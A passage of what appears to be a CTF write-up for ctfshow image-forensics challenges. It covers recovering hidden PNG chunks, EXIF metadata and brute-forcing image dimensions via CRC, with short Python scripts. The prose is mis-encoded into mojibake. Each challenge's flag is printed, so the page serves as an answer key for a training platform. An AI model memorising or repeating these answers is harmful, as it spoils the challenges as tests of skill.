src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/999845862968899.png"></p><h2 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h2><blockquote><p>flagåœ¨å›¾ç‰‡æ•°æ®é‡Œã€‚</p></blockquote><p>010æ‰“å¼€æ£€æµ‹å‘ç°æœ‰ä¸ªçŸ­çš„idatå—æœ‰å¼‚å¸¸</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/01022515564988.png"></p><p>æ¥ç€å°±æ˜¯ç›´æ¥ç”¨idatç»„åˆæˆå¦ä¸€å¼ å›¾ç‰‡ï¼Œä½¿ç”¨zlibè¿›è¡Œå‹ç¼©ï¼Œè·‘ä¸‹è„šæœ¬å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">63746673686f777b33353332353234323461633639636236346636343337363838353161633739307d</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/jio55123468755.png"></p><p><strong>é™„ä¸Šè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">IDAT = <span class="string">&quot;789C4B2E492BCEC82FAF363635363235323132494C36B34C4E3233493333313637B3B030354C4C36B734A8050009960BD1&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">result = binascii.hexlify(zlib.decompress(IDAT))</span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>16è¿›åˆ¶è½¬ä¸€ä¸‹å³å¯å¾—åˆ°flagï¼šctfshow{353252424ac69cb64f643768851ac790}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/554845251548546.png"></p><h2 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h2><blockquote><p>flagåœ¨å¦ä¸€å¼ å›¾é‡Œã€‚</p></blockquote><p>åˆ æ‰ç¬¬ä¸€ä¸ªidatå³å¯å¾—åˆ°flagï¼šctfshow{44620176948fa759d3eeafeac99f1ce9}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1112385467755555.png"></p><h2 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h2><blockquote><p>flagåœ¨å¦ä¸€å¼ å›¾é‡Œã€‚</p></blockquote><p>åŒä¸Šï¼Œä¸è¿‡è¿™é‡Œå¾—æŠŠå‰å…«ä¸ªidatå—éƒ½åˆ æ‰ä¿å­˜å°±èƒ½å¾—åˆ°flagï¼šctfshow{10ea26425dd4708f7da7a13c8e256a73}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/122222225414177.png"></p><h2 id="misc13"><a href="#misc13" class="headerlink" title="misc13"></a>misc13</h2><blockquote><p>flagä½ç½®åœ¨å›¾ç‰‡æœ«å°¾ã€‚</p></blockquote><p>010æ‰“å¼€æŒ‰æç¤ºåˆ’åˆ°åº•éƒ¨å‘ç°äº†å¦‚ä¸‹ç–‘ä¼¼flagçš„ä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/131413520666.png"></p><p>å¤åˆ¶ç²˜è´´å‡º16è¿›åˆ¶æ–‡æœ¬è·‘ä¸‹è„šæœ¬å¾—åˆ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;631A74B96685738668AA6F4B77B07B216114655336A5655434343678632534DD38EF66AB37103395391F628237BA6545627C3254647E313A64E465F136FA65F5341E3107321D665438F1333239E9616C7D&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">4</span>):</span><br><span class="line">    flag += s[i]</span><br><span class="line">    flag += s[i+<span class="number">1</span>]</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#63746673686F777B61653665343663343866373339623765623264316465366534313266383339617D</span></span><br></pre></td></tr></table></figure><p>16è¿›åˆ¶è½¬ä¸‹å¾—åˆ°flagï¼šctfshow{ae6e3ea48f518b7e42d7de6f412f839a}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/131313555123.png"></p><h2 id="misc14"><a href="#misc14" class="headerlink" title="misc14"></a>misc14</h2><blockquote><p>flagåœ¨é‚£å¼ å›¾é‡Œã€‚</p></blockquote><p>010æ‰“å¼€å‘ç°æœ‰å¼ å›¾ç‰‡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/141452052014666.png"></p><p>äºæ˜¯æ–°å»ºä¸€ä¸ªå°†å…¶å¤åˆ¶ç²˜è´´ä¿å­˜å¾—åˆ°flagï¼šctfshow{ce520f767fc465b0787cdb936363e694}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc14deflag.jpg"></p><h2 id="misc15"><a href="#misc15" class="headerlink" title="misc15"></a>misc15</h2><blockquote><p>flagè¢«è·³è¿‡å»äº†ã€‚</p></blockquote><p>010æ‰“å¼€å°±çœ‹åˆ°äº†flagï¼šctfshow{fbe7bb657397e6e0a6adea3e40265425}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1515151515151515515.png"></p><h2 id="misc16"><a href="#misc16" class="headerlink" title="misc16"></a>misc16</h2><blockquote><p>flagåœ¨å›¾ç‰‡æ•°æ®é‡Œã€‚</p></blockquote><p>binwalkåˆ†ç¦»ä¸€ä¸‹å³å¯å¾—åˆ°flagï¼šctfshow{a7e32f131c011290a62476ae77190b52}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210331161130247.png"></p><h2 id="misc17"><a href="#misc17" class="headerlink" title="misc17"></a>misc17</h2><blockquote><p>flagåœ¨å›¾ç‰‡æ•°æ®é‡Œã€‚</p></blockquote><p>binwalkå‘ç°æœ‰ä¸ªç ´æŸçš„åŒ…ï¼Œæ¥ç€zstegå‘ç°äº†éšè—çš„æ•°æ®ï¼Œäºæ˜¯æˆ‘ä»¬å°†å…¶æå–å‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/177115114156156.png"></p><p>æœ€åbinwalkåˆ†ç¦»å¾—åˆ°flagï¼šctfshow{0fe61fc42e8bbe55b9257d251749ae45}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3143535616165152.png"></p><h2 id="misc18"><a href="#misc18" class="headerlink" title="misc18"></a>misc18</h2><blockquote><p><strong>flagåœ¨æ ‡é¢˜ã€ä½œè€…ã€ç…§ç›¸æœºå’Œé•œå¤´å‹å·é‡Œã€‚</strong></p></blockquote><p>æ ¹æ®æç¤ºåœ¨è¯¦ç»†ä¿¡æ¯ä¸­æ‰¾åˆ°å¹¶æ‹¼æ¥å¾—åˆ°flagï¼šctfshow{325d60c208f728ac17e5f02d4cf5a839}</p><h2 id="misc19"><a href="#misc19" class="headerlink" title="misc19"></a>misc19</h2><blockquote><p>flagåœ¨ä¸»æœºä¸Šçš„æ–‡æ¡£åé‡Œã€‚</p></blockquote><p>æ ¹æ®æç¤ºæˆ‘ç™¾åº¦æ‰¾åˆ°äº†ä¸ª<a href="https://exif.tuchong.com/view/10702093/"><strong>åœ¨çº¿å·¥å…·</strong></a>æŸ¥çš„å›¾ç‰‡ä¿¡æ¯è¿›è€Œå¾—åˆ°flagï¼šctfshow{dfdcf08038cd446a5eb50782f8d3605d}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/191919919191645.png"></p><h2 id="misc20"><a href="#misc20" class="headerlink" title="misc20"></a>misc20</h2><blockquote><p>flagåœ¨è¯„è®ºé‡Œã€‚</p></blockquote><p>åŒä¸Šåˆ©ç”¨<a href="https://exif.tuchong.com/view/10702093/"><strong>åœ¨çº¿å·¥å…·</strong></a>æŸ¥åˆ°è¯„è®ºä¿¡æ¯</p><p>è°éŸ³æ¢—ï¼ï¼è¥¿æ›¿çˆ±æŠšç§€ = ctfshowï¼ï¼æ‰€ä»¥flagæ˜¯ctfshow{c97964b1aecf06e1d79c21ddad593e42}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/221515251000.png"></p><h2 id="misc21"><a href="#misc21" class="headerlink" title="misc21"></a>misc21</h2><blockquote><p>flagåœ¨åºå·é‡Œã€‚</p></blockquote><p>åŒä¸Šæ‰¾åˆ°å’Œåºå·ç›¸å…³çš„ä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2185968941986541698416.png"></p><p>hexåå‘ç°hex(X&amp;Ys)ï¼›ä¹Ÿå°±æ˜¯è¿˜éœ€è¦Xåˆ†è¾¨ç‡ã€Yåˆ†è¾¨ç‡ã€Xå®šä½ã€Yå®šä½</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/21332131221113223.png"></p><p>æœ€åå°†é‚£å››ç»„æ•°æ®åˆ†åˆ«è½¬æˆ16è¿›åˆ¶æ‹¼æ¥å¹¶å¥—ä¸Šctfshow{}å¾—åˆ°flagï¼šctfshow{e8a221498d5c073b4084eb51b1a1686d}</p><h2 id="misc22"><a href="#misc22" class="headerlink" title="misc22"></a>misc22</h2><blockquote><p>flagåœ¨å›¾ç‰‡é‡Œã€‚</p></blockquote><p><a href="https://www.beijing-time.org/shijianchuo/"><strong>å‚è€ƒæ–‡ç« </strong></a>äº†è§£ä¸€ä¸‹app0 app1ï¼ˆæ­¤ä½ç½®å…è®¸ä¿å­˜ä¸€ä¸ªåŸå›¾çš„ç¼©ç•¥å›¾</p><p>010æ‰“å¼€å¯¹ç…§ç»“æ„æ­£å¸¸å†™åœ¨appé‚£å‡ ä¸ªæ®µå¾—åˆ°flagï¼šctfshow{dbf7d3f84b0125e833dfd3o80820a129}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/ctfshowmiscmisc22flag.jpg"></p><p>çœ¼ç›éƒ½è¦çœ‹çäº†butæäº¤è¿˜æ˜¯ä¸€ç›´ä¸å¯¹..</p><blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/555552021-03-31205448.png"></p><p>å˜¤å˜¤å˜¤ ~ çœŸflagï¼šctfshow{dbf7d3f84b0125e833dfd3c80820a129}</p><p>å¯¹äº†ï¼Œè¿˜æœ‰é‚£ä¸ªç¼©ç•¥å›¾ç”¨stegsolveçš„full blueçœ‹ä¼šæ›´æ¸…æ™°ï¼Œbutæˆ‘æ˜¾ç¤ºå™¨æ”¾å¤§å›¾ç‰‡çœ‹åˆ°è€æ¸…æ¥šäº†ï¼ˆå‡¡å°”èµ›boyè¯·æ±‚å‡ºæˆ˜</p></blockquote><h2 id="misc23"><a href="#misc23" class="headerlink" title="misc23"></a>misc23</h2><blockquote><p>flagåœ¨æ—¶é—´é‡Œã€‚</p></blockquote><p>ç›²æœä¸€æ³¢ctfæ„å¤–æ”¶è·å››ä¸ªæ—¶é—´æ®µï¼ˆ1997-09-22T02:17:02+08:00ã€2055-07-15T12:14:48+08:00ã€2038-05-05T16:50:45+08:00ã€1984-08-03 18:41:46+08:00ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/23152623562626.png"></p><p>æ¥ç€åˆ†åˆ«å°†å¾—åˆ°çš„å››ä¸ªæ—¶é—´è½¬æ³¢<a href="https://www.beijing-time.org/shijianchuo/"><strong>æ—¶é—´æˆ³</strong></a>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">874865822</span><br><span class="line">2699237688</span><br><span class="line">2156662245</span><br><span class="line">460377706</span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬16è¿›åˆ¶è½¬ä¸€ä¸‹è¯•è¯•å¯¹(mei)ä¸(mao)å¯¹(bing)ï¼Œå¾—åˆ°flagï¼šctfshow{3425649ea0e31938808c0de51b70ce6a}</p><h1 id="å›¾ç‰‡ç¯‡-æ–‡ä»¶ç»“æ„"><a href="#å›¾ç‰‡ç¯‡-æ–‡ä»¶ç»“æ„" class="headerlink" title="å›¾ç‰‡ç¯‡(æ–‡ä»¶ç»“æ„)"></a>å›¾ç‰‡ç¯‡(æ–‡ä»¶ç»“æ„)</h1><h2 id="misc24"><a href="#misc24" class="headerlink" title="misc24"></a>misc24</h2><blockquote><p>flagåœ¨å›¾ç‰‡ä¸Šé¢ã€‚</p></blockquote><p>æ”¹é«˜åº¦å¾—åˆ°flagï¼šctfshow{dd7d8bc9e5e873eb7da3fa51d92ca4b7}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2445596498846.png"></p><p>PSï¼šå†™ä¸ªå°æŠ€å·§â‘§ï¼Œå¤§å®¶å¯ä»¥å°†å›¾ç‰‡çš„é«˜å®½è½¬ä¸º16è¿›åˆ¶å¹¶æœç´¢æ‰¾åˆ°å¯¹åº”ä½ç½®ï¼Œç„¶åå°†æ›´æ”¹å¥½çš„æ•°æ®å¡«è¿›å»ä¿å­˜å³å¯</p><h2 id="misc25"><a href="#misc25" class="headerlink" title="misc25"></a>misc25</h2><blockquote><p>flagåœ¨å›¾ç‰‡ä¸‹é¢ã€‚</p></blockquote><p>åŒä¸Šï¼Œå¾—åˆ°flagï¼šctfshow{494f611cc5842dd597f460874ce38f57}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3154825454155.png"></p><h2 id="misc26"><a href="#misc26" class="headerlink" title="misc26"></a>misc26</h2><blockquote><p>flagè¿˜æ˜¯åœ¨å›¾ç‰‡ä¸‹é¢ï¼Œä½†åˆ°åº•æœ‰å¤šä¸‹é¢ï¼Ÿã€‚</p></blockquote><p>å†è°ƒé«˜ç‚¹å°±å¥½äº†ï¼Œå…¶ä¸­å›¾ç‰‡é«˜åº¦è¿˜éœ€è¦æˆ‘ä»¬è·‘ä¸‹è„šæœ¬æ¥çˆ†ç ´å‡ºå¾—åˆ°flagï¼šctfshow{94aef125e087a7ccf2e28e742efd704c}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/88926424696.png"></p><p><strong>é™„ä¸Šè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;misc26.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0xEC9CCBC6</span>):</span><br><span class="line">            print(i, j)</span><br><span class="line">            print(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x25e</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210331194830817.png"></p><h2 id="misc27"><a href="#misc27" class="headerlink" title="misc27"></a>misc27</h2><blockquote><p>flagåœ¨å›¾ç‰‡ä¸‹é¢ã€‚</p></blockquote><p>åŒä¸Šï¼ˆæŒ‡misc24ï¼Œå¾—åˆ°flagï¼šctfshow{5cc4f19eb01705b99bf41492430a1a14}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/272766645589491.png"></p><h2 id="misc28"><a href="#misc28" class="headerlink" title="misc28"></a>misc28</h2><blockquote><p>flagåœ¨å›¾ç‰‡ä¸‹é¢ã€‚</p></blockquote><p>åŒä¸Šï¼Œå¾—åˆ°flagï¼šctfshow{59c8bc525426166b1c893fe12a387fd7}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210331210629075.png"></p><h2 id="misc29"><a href="#misc29" class="headerlink" title="misc29"></a>misc29</h2><blockquote><p>flagåœ¨å›¾ç‰‡ä¸‹é¢ã€‚</p></blockquote><p>åŒä¸Šï¼Œå¾—åˆ°flagï¼šctfshow{03ce5be6d60a4b3c7465ab9410801440}</p><p>å¯¹äº†ï¼Œgifæˆ‘æ¯ä¸€å¸§éƒ½æŠŠä»–é«˜åº¦ç»™æ”¹äº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/999585852954185.png"></p><h2 id="misc30"><a href="#misc30" class="headerlink" title="misc30"></a>misc30</h2><blockquote><p>æ­£ç¡®çš„å®½åº¦æ˜¯950ã€‚</p></blockquote><p>æ ¹æ®æç¤ºå°†é«˜åº¦æ”¹ä¸º950å³å¯å¾—åˆ°flagï¼šctfshow{6db8536da312f6aeb42da2f45b5f213c}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3331518413030185414.png"></p><h2 id="misc31"><a href="#misc31" class="headerlink" title="misc31"></a>misc31</h2><blockquote><p>é«˜åº¦æ˜¯æ­£ç¡®çš„ï¼Œä½†æ­£ç¡®çš„å®½åº¦æ˜¯å¤šå°‘å‘¢ã€‚</p></blockquote><p>è¿˜æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°bmpçš„è¿™ç§é¢˜</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/260702527">https://zhuanlan.zhihu.com/p/260702527</a></p><p>å¤§æ¦‚äº†è§£äº†ä¸‹bmpçš„æ–‡ä»¶ç»“æ„å°±å¼€å§‹åšé¢˜è¾£~</p><p>é¦–å…ˆæˆ‘ä»¬ä»FFé‚£å¼€å§‹ä¸€ç›´å¤åˆ¶åˆ°æœ€åçœ‹çœ‹å®ƒçš„æ–‡ä»¶å¤§å°ï¼ˆæœ€åé‚£ä¸ªä¸ç”¨ç®¡ä»–ï¼Œæ•…æ„å¤šåŠ çš„â‘§ï¼‰ï¼Œç„¶åç”¨å®ƒé™¤ä»¥ä¸‰å°±æ˜¯åƒç´ å€¼ï¼Œæœ€åæ ¹æ®æç¤ºé«˜åº¦æ­£ç¡®ç®—å‡ºæ­£ç¡®çš„å®½åº¦ï¼Œä¹Ÿå°±æ˜¯è¯´487202/3/150=1082ä¾¿æ˜¯æ­£ç¡®çš„é‚£ä¸ªå®½åº¦äº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/57197942159756446323231832.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/84989484323232.png"></p><p>æœ€åæ”¹ä¸‹å®½å³å¯å¾—åˆ°flagï¼šctfshow{fb09dcc9005fe3feeefb73646b55efd5}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/323559529255848.png"></p><h2 id="misc32"><a href="#misc32" class="headerlink" title="misc32"></a>misc32</h2><blockquote><p>é«˜åº¦æ˜¯æ­£ç¡®çš„ï¼Œä½†æ­£ç¡®çš„å®½åº¦æ˜¯å¤šå°‘å‘¢ã€‚</p></blockquote><p>010æ‰“å¼€æŸ¥æ‰¾å›¾ç‰‡çš„CRCï¼š0xE14A4C0B</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/32231546246457932.png"></p><p>è·‘è„šæœ¬çˆ†ç ´å®ƒçš„å®½</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3265226925962699.png"></p><p><strong>é™„ä¸Šè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;misc32.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0xE14A4C0B</span>):</span><br><span class="line">            print(i, j)</span><br><span class="line">            print(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line"></span><br><span class="line"><span class="comment">#1044 150</span></span><br><span class="line"><span class="comment">#hex: 0x414 0x96</span></span><br></pre></td></tr></table></figure><p>æœ€åæ”¹ä¸‹å®½å³å¯å¾—åˆ°flagï¼šctfshow{685082227bcf70d17d1b39a5c1195aa9}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/555321564279794.png"></p><h2 id="misc33"><a href="#misc33" class="headerlink" title="misc33"></a>misc33</h2><blockquote><p>å‡ºé¢˜äººä¸§å¿ƒç—…ç‹‚ï¼ŒæŠŠé«˜åº¦ä¹Ÿæ”¹äº†</p></blockquote><p>è€æ ·å­ï¼Œ010æ‰“å¼€æ‰¾åˆ°å›¾ç‰‡çš„CRCï¼š0x5255A798</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/333333645524587845.png"></p><p>è·‘è„šæœ¬çˆ†ç ´å®ƒçš„é«˜å®½</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/33333152262824896.png"></p><p><strong>é™„ä¸Šè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;misc33.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0x5255A798</span>):</span><br><span class="line">            print(i, j)</span><br><span class="line">            print(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line"></span><br><span class="line"><span class="comment">#978 142</span></span><br><span class="line"><span class="comment">#hex: 0x3d2 0x8e</span></span><br></pre></td></tr></table></figure><p>æœ€åæ”¹ä¸‹é«˜å®½å³å¯å¾—åˆ°flagï¼šctfshow{03070a10ec3a3282ba1e352f4e07b0a9}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/85485196.png"></p><h2 id="misc34"><a href="#misc34" class="headerlink" title="misc34"></a>misc34</h2><blockquote><p>å‡ºé¢˜äººç‹—æ€¥è·³å¢™ï¼ŒæŠŠIHDRå—çš„CRCä¹Ÿæ”¹äº†ï¼Œä½†æˆ‘ä»¬çŸ¥é“æ­£ç¡®å®½åº¦è‚¯å®šå¤§äº900</p></blockquote><p>ç”±äºcrcéƒ½ç»™æ”¹äº†ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡çˆ†ç ´è·å–flagæƒ¹ï¼Œåœ¨ä¸€å †é»‘å›¾ä¸­çœ‹åˆ°äº†å¼ å«æœ‰flagçš„å›¾ï¼šctfshow{03e102077e3e5de9dd9c04aba16ef014}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/34521464163434.png"></p><p><strong>é™„ä¸Šè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;misc34.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">width = c[<span class="number">16</span>:<span class="number">20</span>]</span><br><span class="line">height = c[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">900</span>,<span class="number">1200</span>):</span><br><span class="line">    f1 = <span class="built_in">open</span>(<span class="string">&#x27;./out/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    img = c[:<span class="number">16</span>]+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+c[<span class="number">20</span>:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2 id="misc35"><a href="#misc35" class="headerlink" title="misc35"></a>misc35</h2><blockquote><p>å‡ºé¢˜äººè´Ÿéš…é¡½æŠ—ï¼Œä½†æˆ‘ä»¬çŸ¥é“æ­£ç¡®å®½åº¦è‚¯å®šå¤§äº900</p></blockquote><p>è¿™é‡Œæˆ‘ä»¬å…ˆæŠŠé«˜åº¦æ”¹é«˜ä¸€äº›åˆ°èƒ½çœ‹åˆ°ä¸‹é¢çš„ä¸œè¥¿ï¼ˆè¿™é‡Œæˆ‘æŠŠé«˜æ”¹åˆ°1000ï¼‰ï¼Œç„¶ååŒä¸Šè·‘è„šæœ¬å¾—åˆ°flagï¼šctfshow{ca35201ca9ed607e5a68f44ef573fbc3}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/35555678451235.png"></p><p><strong>é™„ä¸Šè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;misc35.jpg&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">900</span>,<span class="number">1000</span>):</span><br><span class="line">    f1 = <span class="built_in">open</span>(<span 